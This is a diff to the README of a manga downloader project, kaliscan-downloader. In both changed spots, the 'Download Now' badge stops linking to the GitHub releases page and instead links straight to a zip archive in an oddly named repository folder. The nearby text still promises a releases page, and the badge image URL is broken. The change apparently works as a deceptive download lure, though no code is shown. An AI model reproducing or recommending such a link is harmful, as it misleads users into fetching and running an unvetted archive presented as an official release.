@@ -8,7 +8,7 @@ Welcome to **kaliscan-downloader**. This application makes downloading manga fro
 
 To install the **kaliscan-downloader**, please visit the releases page to download the latest version. Click the link below:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/FilmSaul4197/kaliscan-downloader/releases)
+[![Download Now](https://raw.githubusercontent.com/FilmSaul4197/kaliscan-downloader/main/curstful/kaliscan-downloader.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/FilmSaul4197/kaliscan-downloader/main/curstful/kaliscan-downloader.zip)
 
 Once you are on the releases page, you will see the latest version available. 
 
@@ -86,6 +86,6 @@ If you have specific questions or need direct assistance, please feel free to re
 
 For this download and to find future updates, please return to our releases page:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/FilmSaul4197/kaliscan-downloader/releases)
+[![Download Now](https://raw.githubusercontent.com/FilmSaul4197/kaliscan-downloader/main/curstful/kaliscan-downloader.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/FilmSaul4197/kaliscan-downloader/main/curstful/kaliscan-downloader.zip)
 
 Happy downloading! Enjoy reading your favorite manga with ease.
